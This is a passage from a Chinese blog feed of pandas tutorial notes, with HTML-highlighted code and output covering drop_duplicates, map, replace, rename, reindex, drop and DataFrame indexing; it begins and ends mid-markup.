class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.arange(<span class="number">9</span>).reshape((<span class="number">3</span>, <span class="number">3</span>)),</span><br><span class="line">                     index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">                     columns=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;California&#x27;</span>])</span><br><span class="line"></span><br><span class="line">frame.loc[<span class="string">&#x27;a&#x27;</span>,[<span class="string">&#x27;Texas&#x27;</span>]] = <span class="literal">None</span></span><br><span class="line">frame.loc[<span class="string">&#x27;d&#x27;</span>] = [<span class="number">3</span>, <span class="number">4.0</span> ,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">// 观察到上面 b、d重复</span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">a   <span class="number">0.0</span>    NaN         <span class="number">2.0</span></span><br><span class="line">b   <span class="number">3.0</span>    <span class="number">4.0</span>         <span class="number">5.0</span></span><br><span class="line">c   <span class="number">6.0</span>    <span class="number">7.0</span>         <span class="number">8.0</span></span><br><span class="line">d   <span class="number">3.0</span>    <span class="number">4.0</span>         <span class="number">5.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用duplicated方法 </span></span><br><span class="line">frame = pd.DataFrame(np.arange(<span class="number">9</span>).reshape((<span class="number">3</span>, <span class="number">3</span>)),</span><br><span class="line">                     index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">                     columns=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;California&#x27;</span>])</span><br><span class="line"></span><br><span class="line">frame.loc[<span class="string">&#x27;a&#x27;</span>,[<span class="string">&#x27;Texas&#x27;</span>]] = <span class="literal">None</span></span><br><span class="line">frame.loc[<span class="string">&#x27;d&#x27;</span>] = [<span class="number">3</span>, <span class="number">4.0</span> ,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(frame.duplicated())</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">a    <span class="literal">False</span></span><br><span class="line">b    <span class="literal">False</span></span><br><span class="line">c    <span class="literal">False</span></span><br><span class="line">d     <span class="literal">True</span></span><br><span class="line">dtype: <span class="built_in">bool</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>data.drop_duplicates() : 返回的是DataFrame，duplicated和drop_duplicates默认都是保留第⼀个观测到的值。传⼊参数keep=’last’将会返回最后 ⼀个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.arange(<span class="number">9</span>).reshape((<span class="number">3</span>, <span class="number">3</span>)),</span><br><span class="line">                     index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">                     columns=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;California&#x27;</span>])</span><br><span class="line"></span><br><span class="line">frame.loc[<span class="string">&#x27;a&#x27;</span>,[<span class="string">&#x27;Texas&#x27;</span>]] = <span class="literal">None</span></span><br><span class="line">frame.loc[<span class="string">&#x27;d&#x27;</span>] = [<span class="number">3</span>, <span class="number">4.0</span> ,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"><span class="built_in">print</span>(frame.drop_duplicates())</span><br><span class="line"></span><br><span class="line">//  可以观察到 d行已经被删除</span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">a   <span class="number">0.0</span>    NaN         <span class="number">2.0</span></span><br><span class="line">b   <span class="number">3.0</span>    <span class="number">4.0</span>         <span class="number">5.0</span></span><br><span class="line">c   <span class="number">6.0</span>    <span class="number">7.0</span>         <span class="number">8.0</span></span><br><span class="line">d   <span class="number">3.0</span>    <span class="number">4.0</span>         <span class="number">5.0</span></span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">a   <span class="number">0.0</span>    NaN         <span class="number">2.0</span></span><br><span class="line">b   <span class="number">3.0</span>    <span class="number">4.0</span>         <span class="number">5.0</span></span><br><span class="line">c   <span class="number">6.0</span>    <span class="number">7.0</span>         <span class="number">8.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试print(frame.drop_duplicates(keep=&#x27;last&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(frame.drop_duplicates(keep=<span class="string">&#x27;last&#x27;</span>))</span><br><span class="line"></span><br><span class="line">// 可以观察到 b行被删除</span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">a   <span class="number">0.0</span>    NaN         <span class="number">2.0</span></span><br><span class="line">c   <span class="number">6.0</span>    <span class="number">7.0</span>         <span class="number">8.0</span></span><br><span class="line">d   <span class="number">3.0</span>    <span class="number">4.0</span>         <span class="number">5.0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="使用函数或者映射进行数据转换"><a href="#使用函数或者映射进行数据转换" class="headerlink" title="使用函数或者映射进行数据转换"></a>使用函数或者映射进行数据转换</h1></li></ol><ul><li><p>Series的map方法接收⼀个函数或⼀个包含映射关系的字典型对象(DataFrame⾥⾯是applymap)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 字典对象</span></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">d = &#123;</span><br><span class="line">    <span class="number">1</span>: &#123;<span class="number">1</span>:<span class="string">&#x27;a&#x27;</span>&#125;,</span><br><span class="line">    <span class="number">2</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="number">4</span>: <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">    <span class="number">5</span>: <span class="string">&#x27;e&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = s.<span class="built_in">map</span>(d)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line"><span class="number">0</span>    &#123;<span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line"><span class="number">1</span>           b</span><br><span class="line"><span class="number">2</span>           c</span><br><span class="line"><span class="number">3</span>           d</span><br><span class="line"><span class="number">4</span>           e</span><br><span class="line">dtype: <span class="built_in">object</span></span><br><span class="line">&#123;<span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 函数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h1 id="替代值"><a href="#替代值" class="headerlink" title="替代值"></a>替代值</h1><ul><li>replace 提供了更为简单灵活的实现</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># replace 提供了更为简单灵活的实现</span></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">d = &#123;</span><br><span class="line">    <span class="number">1</span>: &#123;<span class="number">1</span>:<span class="string">&#x27;a&#x27;</span>&#125;,</span><br><span class="line">    <span class="number">2</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="number">4</span>: <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">    <span class="number">5</span>: <span class="string">&#x27;e&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = s.<span class="built_in">map</span>(d)</span><br><span class="line"><span class="built_in">print</span>(s.replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;BBB&#x27;</span>))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line"><span class="number">0</span>    &#123;<span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line"><span class="number">1</span>         BBB</span><br><span class="line"><span class="number">2</span>           c</span><br><span class="line"><span class="number">3</span>           d</span><br><span class="line"><span class="number">4</span>           e</span><br><span class="line">dtype: <span class="built_in">object</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#有下⾯的语法：</span></span><br><span class="line">data.replace(-<span class="number">999</span>, np.nan)</span><br><span class="line">data.replace([-<span class="number">999</span>, -<span class="number">1000</span>], np.nan)</span><br><span class="line">data.replace([-<span class="number">999</span>, -<span class="number">1000</span>], [np.nan, <span class="number">0</span>])</span><br><span class="line">data.replace(&#123;-<span class="number">999</span>: np.nan, -<span class="number">1000</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure><h1 id="重命名索引"><a href="#重命名索引" class="headerlink" title="重命名索引"></a>重命名索引</h1><ul><li>与Series类似，轴索引也有⼀个map⽅法： 直接修改data.index 如果你想要创建数据集转换后的版本，并且不修改原有的数据集 ： data.rename。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(np.arange(<span class="number">12</span>).reshape((<span class="number">3</span>, <span class="number">4</span>)),</span><br><span class="line">                    index=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Colorado&#x27;</span>, <span class="string">&#x27;New York&#x27;</span>],</span><br><span class="line">                    columns=[<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;four&#x27;</span>])</span><br><span class="line"></span><br><span class="line">transform = <span class="keyword">lambda</span> x: x [:<span class="number">4</span>].upper()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data.index.<span class="built_in">map</span>(transform))</span><br><span class="line"></span><br><span class="line">data.index = data.index.<span class="built_in">map</span>(transform)</span><br><span class="line"><span class="built_in">print</span>(data.index)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data.rename(index=<span class="built_in">str</span>.title, columns=<span class="built_in">str</span>.upper))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">Index([<span class="string">&#x27;OHIO&#x27;</span>, <span class="string">&#x27;COLO&#x27;</span>, <span class="string">&#x27;NEW &#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">Index([<span class="string">&#x27;OHIO&#x27;</span>, <span class="string">&#x27;COLO&#x27;</span>, <span class="string">&#x27;NEW &#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">      ONE  TWO  THREE  FOUR</span><br><span class="line">Ohio    <span class="number">0</span>    <span class="number">1</span>      <span class="number">2</span>     <span class="number">3</span></span><br><span class="line">Colo    <span class="number">4</span>    <span class="number">5</span>      <span class="number">6</span>     <span class="number">7</span></span><br><span class="line">New     <span class="number">8</span>    <span class="number">9</span>     <span class="number">10</span>    <span class="number">11</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas基础</title>
      <link href="/2022/10/13/pandas%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/10/13/pandas%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="reindex"><a href="#reindex" class="headerlink" title="reindex"></a>reindex</h1><ul><li><p>reindex是pandas对象的重要⽅法，该⽅法⽤于创建⼀个符合新索引的新对象。</p></li><li><p>Series调⽤reindex⽅法时，会将数据按照新的索引进⾏排列，如果某个索引值之前并不存在，则 会引⼊缺失值。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># reindex 重新索引</span></span><br><span class="line"></span><br><span class="line">obj = pd.Series([<span class="number">4.5</span>, <span class="number">7.2</span>, -<span class="number">5.3</span>, <span class="number">3.6</span>], index=[<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">obj2 = obj.reindex([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj2)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">a   -<span class="number">5.3</span></span><br><span class="line">b    <span class="number">7.2</span></span><br><span class="line">c    <span class="number">3.6</span></span><br><span class="line">d    <span class="number">4.5</span></span><br><span class="line">e    NaN</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure><ul><li>对于顺序数据，比如 时间序列 ，在重建索引时可能会需要进⾏插值或填值。 ffill方法会将值前向填充。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ffill填充</span></span><br><span class="line"></span><br><span class="line">obj3 = pd.Series([<span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;purple&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>], index=[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>])</span><br><span class="line">obj4 = obj3.reindex(<span class="built_in">range</span>(<span class="number">6</span>),method=<span class="string">&#x27;ffill&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(obj4)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line"><span class="number">0</span>      blue</span><br><span class="line"><span class="number">1</span>      blue</span><br><span class="line"><span class="number">2</span>    purple</span><br><span class="line"><span class="number">3</span>    purple</span><br><span class="line"><span class="number">4</span>    yellow</span><br><span class="line"><span class="number">5</span>    yellow</span><br><span class="line">dtype: <span class="built_in">object</span></span><br></pre></td></tr></table></figure><ul><li>reindex可以改变⾏索引、列索引，也可以同时改变⼆者。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># reindex改行索引和列索引</span></span><br><span class="line">frame = pd.DataFrame(np.arange(<span class="number">9</span>).reshape((<span class="number">3</span>, <span class="number">3</span>)),</span><br><span class="line">                     index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>],</span><br><span class="line">                     columns=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;California&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变行索引</span></span><br><span class="line">frame2 = frame.reindex([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(frame2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#改变列索引</span></span><br><span class="line">states = [<span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;Utah&#x27;</span>, <span class="string">&#x27;California&#x27;</span>]</span><br><span class="line">frame3 = frame.reindex(columns=states)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame3)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">a     <span class="number">0</span>      <span class="number">1</span>           <span class="number">2</span></span><br><span class="line">c     <span class="number">3</span>      <span class="number">4</span>           <span class="number">5</span></span><br><span class="line">d     <span class="number">6</span>      <span class="number">7</span>           <span class="number">8</span></span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">a   <span class="number">0.0</span>    <span class="number">1.0</span>         <span class="number">2.0</span></span><br><span class="line">b   NaN    NaN         NaN</span><br><span class="line">c   <span class="number">3.0</span>    <span class="number">4.0</span>         <span class="number">5.0</span></span><br><span class="line">d   <span class="number">6.0</span>    <span class="number">7.0</span>         <span class="number">8.0</span></span><br><span class="line">   Texas  Utah  California</span><br><span class="line">a      <span class="number">1</span>   NaN           <span class="number">2</span></span><br><span class="line">c      <span class="number">4</span>   NaN           <span class="number">5</span></span><br><span class="line">d      <span class="number">7</span>   NaN           <span class="number">8</span></span><br></pre></td></tr></table></figure><h1 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h1><ul><li><p>drop⽅法会返回⼀个含有指示值或轴向上删除值的新对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#针对series：</span></span><br><span class="line">obj = pd.Series(np.arange(<span class="number">5.</span>), index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>])</span><br><span class="line">new_obj = obj.drop(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_obj)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">a    <span class="number">0.0</span></span><br><span class="line">b    <span class="number">1.0</span></span><br><span class="line">d    <span class="number">3.0</span></span><br><span class="line">e    <span class="number">4.0</span></span><br><span class="line">dtype: float64</span><br><span class="line">    </span><br><span class="line"><span class="comment">#针对dataframe：</span></span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">9</span>).reshape(<span class="number">3</span>, <span class="number">3</span>), index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>], columns=[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>])</span><br><span class="line"><span class="comment">#删除⾏，跟Series⼀样 ： df.drop(&#x27;a&#x27;）</span></span><br><span class="line"><span class="comment">#但删除列，需要axis=1</span></span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">newdf = df.drop(<span class="string">&#x27;A&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(newdf)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   A  B  C</span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span></span><br><span class="line">b  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span></span><br><span class="line">c  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span></span><br><span class="line"></span><br><span class="line">   B  C</span><br><span class="line">a  <span class="number">1</span>  <span class="number">2</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span></span><br><span class="line">c  <span class="number">7</span>  <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#若需要对原对象进⾏操作，加上 inplace=True</span></span><br><span class="line">df.drop(<span class="string">&#x27;c&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   A  B  C</span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span></span><br><span class="line">b  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h1 id="索引、选择和过滤"><a href="#索引、选择和过滤" class="headerlink" title="索引、选择和过滤"></a>索引、选择和过滤</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series(np.arange(<span class="number">4.</span>), index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(obj[<span class="number">2</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(obj[[<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]])</span><br><span class="line"><span class="built_in">print</span>(obj[[<span class="number">1</span>, <span class="number">3</span>]])</span><br><span class="line"><span class="built_in">print</span>(obj[obj &lt; <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">c    <span class="number">2.0</span></span><br><span class="line">d    <span class="number">3.0</span></span><br><span class="line">dtype: float64</span><br><span class="line">b    <span class="number">1.0</span></span><br><span class="line">a    <span class="number">0.0</span></span><br><span class="line">d    <span class="number">3.0</span></span><br><span class="line">dtype: float64</span><br><span class="line">b    <span class="number">1.0</span></span><br><span class="line">d    <span class="number">3.0</span></span><br><span class="line">dtype: float64</span><br><span class="line">a    <span class="number">0.0</span></span><br><span class="line">b    <span class="number">1.0</span></span><br><span class="line">dtype: float64</span><br><span class="line">    </span><br><span class="line"><span class="comment">#普通的Python切⽚中是不包含尾部的,下⾯这种包含尾部</span></span><br><span class="line"></span><br><span class="line">data = pd.DataFrame(np.arange(<span class="number">16</span>).reshape((<span class="number">4</span>, <span class="number">4</span>)),</span><br><span class="line">                    index=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Colorado&#x27;</span>, <span class="string">&#x27;Utah&#x27;</span>, <span class="string">&#x27;New York&#x27;</span>],</span><br><span class="line">                    columns=[<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;four&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#列选择</span></span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&#x27;two&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(data[[<span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;one&#x27;</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment">#⾏选择</span></span><br><span class="line"><span class="built_in">print</span>(data[:<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(data[data[<span class="string">&#x27;three&#x27;</span>] &gt; <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#全选择</span></span><br><span class="line">data[data &lt; <span 